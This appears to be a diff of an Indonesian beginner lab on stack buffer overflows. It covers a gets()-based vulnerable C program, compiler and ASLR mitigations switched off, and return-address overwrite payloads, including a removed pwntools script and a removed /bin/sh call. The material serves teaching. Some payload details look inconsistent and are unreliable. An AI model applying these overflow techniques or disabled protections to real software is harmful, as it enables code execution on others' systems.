@@ -1,52 +1,37 @@
-# Disable ASLR (sementara)
-echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-
-sudo apt update
-sudo apt install gcc gdb pwndbg python3-pwntools
-
-
 #include <stdio.h>
 #include <string.h>
-#include <stdlib.h>
 
 void secret() {
-    printf("📢 Anda berhasil mengakses fungsi rahasia!\n");
-    system("/bin/sh");
+    printf("🚨 Anda telah mengakses fungsi RAHASIA!\n");
 }
 
 void vulnerable() {
-    char buffer[64];
-    printf("Masukkan input Anda: ");
-    gets(buffer);  // fungsi berbahaya
+    char buffer[32];
+    printf("Masukkan input: ");
+    gets(buffer);  // fungsi tidak aman!
+    printf("Halo: %s\n", buffer);
 }
 
 int main() {
     vulnerable();
-    printf("Selesai.\n");
     return 0;
 }
 
 
-gcc -no-pie -fno-stack-protector vuln.c -o vuln
-
-objdump -d ./vuln | grep secret
-
-python3 -c "from pwn import *; print(cyclic(100))" > pattern.txt
-./vuln < pattern.txt
+gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
 
 gdb ./vuln
-(gdb) r < pattern.txt
-(gdb) info registers rip
+(gdb) disas vulnerable
+(gdb) p &secret
+$1 = 0x080491f6   <--- catat alamat ini
 
-python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
 
-# exploit.py
-from pwn import *
+python3 -c "print('A'*40)" > payload.txt
+./vuln < payload.txt
 
-payload = b'A'*72 + p64(0x11a9)
+python3 -c "print('A'*40 + '\xf6\x91\x04\x08')" > payload.txt
+./vuln < payload.txt
 
-p = process('./vuln')
-p.sendline(payload)
-p.interactive()
-
-python3 exploit.py
+gdb:
+(gdb) run < payload.txt
+(gdb) info registers
